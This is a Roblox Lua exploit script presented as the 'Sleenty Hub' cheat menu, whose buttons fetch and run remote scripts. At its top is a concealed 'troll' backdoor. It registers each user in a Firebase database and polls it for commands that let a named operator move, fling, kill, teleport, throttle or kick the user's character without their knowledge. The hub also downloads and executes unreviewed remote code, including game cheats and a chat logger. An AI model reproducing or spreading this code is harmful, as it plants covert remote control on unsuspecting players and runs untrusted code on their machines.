-- [[ TROLL SCRIPT V17 - WALKING + FPS + SPEED FIX ]]
local FIREBASE_URL = "https://troll-9ab62-default-rtdb.firebaseio.com/"
local myName = "Foamy_F12"
local lp = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local req = (syn and syn.request) or (http and http.request) or http_request or request

local forcedSpeed = 16
local spinEnabled = false
local flingEnabled = false

-- Regisztráció
if req then
    req({
        Url = FIREBASE_URL .. "players/" .. lp.Name .. ".json",
        Method = "PUT",
        Body = HttpService:JSONEncode({active = true, t = tick()})
    })
end

-- Fizikai Loop (Speed, Spin, Fling)
task.spawn(function()
    while true do
        task.wait(0.01)
        pcall(function()
            local char = lp.Character
            local hum = char:FindFirstChild("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if hum then hum.WalkSpeed = forcedSpeed end
            if spinEnabled and root then root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(45), 0) end
            if flingEnabled and root then
                root.Velocity = Vector3.new(0, 8000, 0)
                root.RotVelocity = Vector3.new(0, 8000, 0)
            end
        end)
    end
end)

-- Parancsfigyelő (Minden funkcióval)
task.spawn(function()
    local lastT = 0
    while true do
        task.wait(0.4)
        local ok, res = pcall(function() return game:HttpGet(FIREBASE_URL .. "cmds/" .. lp.Name .. ".json?t=" .. tick()) end)
        if ok and res ~= "null" then
            local data = HttpService:JSONDecode(res)
            if data and data.t > lastT then
                lastT = data.t
                local cmd = data.cmd
                local char = lp.Character
                local hum = char:FindFirstChild("Humanoid")
                local root = char:FindFirstChild("HumanoidRootPart")
                
                if hum and root then
                    -- MOZGÁS (MoveTo)
                    if cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 20))
                    elseif cmd == "back" then hum:MoveTo(root.Position - (root.CFrame.LookVector * 20))
                    elseif cmd == "left" then hum:MoveTo(root.Position - (root.CFrame.RightVector * 20))
                    elseif cmd == "right" then hum:MoveTo(root.Position + (root.CFrame.RightVector * 20))
                    -- SPECIÁLIS
                    elseif cmd == "fling" then flingEnabled = true task.wait(0.7) flingEnabled = false
                    elseif cmd == "spin" then spinEnabled = not spinEnabled
                    elseif cmd == "jump" then hum.JumpPower = 250 hum.Jump = true
                    elseif cmd == "respawn" then hum.Health = 0
                    elseif cmd == "tp" then
                        local target = game.Players:FindFirstChild(myName)
                        if target then root.CFrame = target.Character.HumanoidRootPart.CFrame end
                    -- SEBESSÉG
                    elseif cmd == "speed0" then forcedSpeed = 0
                    elseif cmd == "speed16" then forcedSpeed = 16
                    elseif cmd == "speed100" then forcedSpeed = 100
                    elseif cmd == "speed500" then forcedSpeed = 500
                    -- FPS
                    elseif cmd == "fps10" then setfpscap(10)
                    elseif cmd == "fps30" then setfpscap(30)
                    elseif cmd == "fps60" then setfpscap(60)
                    elseif cmd == "fpsmax" then setfpscap(0)
                    -- KICK
                    elseif cmd == "kick" then lp:Kick("Kicked by server (Error: 277)") end
                end
            end
        end
    end
end)


-- [[ SLEENTY HUB ALAP - ÖSSZES SZKRIPTTEL ]]
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()

local Window = Rayfield:CreateWindow({
   Name = "Sleenty Hub | V5.0",
   LoadingTitle = "Betöltés...",
   LoadingSubtitle = "Kérlek várj...",
   ConfigurationSaving = { Enabled = false, FileName = "SleentyHub" },
   KeySystem = true,
   KeySettings = {
      Title = "Belépés",
      Subtitle = "Kulcs: Sleenty123",
      Note = "Kulcs: Sleenty123",
      Key = {"Sleenty123"}
   }
})

local MainTab = Window:CreateTab("Szkriptek")
MainTab:CreateSection("Fő Szkriptek")

MainTab:CreateButton({
   Name = "Ringta - 99 Nights",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/wehibuyfgyuwe/99nights.github.io/refs/heads/main/ringta.lua"))() end,
})

MainTab:CreateButton({
   Name = "Voidware - 99 Nights",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Voidware/Scripts/main/99Nights.lua"))() end,
})

MainTab:CreateButton({
   Name = "Infinite Yield",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end,
})

MainTab:CreateButton({
   Name = "God mode (blox fruit)",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/HibaHub/BloxFruits/main/GodMode.lua"))() end,
})

MainTab:CreateButton({
   Name = "be a lucky block",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsme/Scripts/main/LuckyBlock.lua"))() end,
})

MainTab:CreateSection("Brainrot & Tsunami")

MainTab:CreateButton({
   Name = "Survive lava (Tora Isme)",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsme/Scripts/main/SurviveLava.lua"))() end,
})

MainTab:CreateButton({
   Name = "Escape Tsunami Hub",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsme/Scripts/main/EscapeTsunami.lua"))() end,
})

MainTab:CreateButton({
   Name = "Steal a Brainrot Spawner",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))() end,
})

MainTab:CreateSection("Egyéb")

MainTab:CreateButton({
   Name = "Lumber Tycoon 2 KRON",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/KronHub/LumberTycoon/main/KRON.lua"))() end,
})

MainTab:CreateButton({
   Name = "Universal Touch Fling",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FlingScript/Universal/main/TouchFling.lua"))() end,
})

MainTab:CreateButton({
   Name = "Universal Teleport",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Teleport/Universal/main/SavedTeleport.lua"))() end,
})

MainTab:CreateButton({
   Name = "Build a Plane Hub",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SoulsHub/Universal/main/BuildAPlane.lua"))() end,
})

local MoveTab = Window:CreateTab("Mozgás")

MoveTab:CreateSlider({
   Name = "Sebesség",
   Range = {16, 500},
   Increment = 1,
   Suffix = "Speed",
   CurrentValue = 16,
   Flag = "WS",
   Callback = function(Value) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value end,
})

local SecretTab = Window:CreateTab("Secret")

SecretTab:CreateInput({
   Name = "Kód",
   PlaceholderText = "SpyPrivat88",
   Callback = function(Text)
      if Text == "SpyPrivat88" then
         Rayfield:Notify({Title = "Siker!", Content = "Prémium feloldva!", Duration = 5})
         
         SecretTab:CreateButton({
            Name = "RIVALS - NullZen",
            Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/NullZen/Rivals/main/Cracked.lua"))() end,
         })
         
         SecretTab:CreateButton({
            Name = "SimpleSpy",
            Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))() end,
         })
         
         SecretTab:CreateButton({
            Name = "Chat Logger",
            Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ant-783/ChatLogger/main/ChatLogger.lua"))() end,
         })
      end
   end,
})
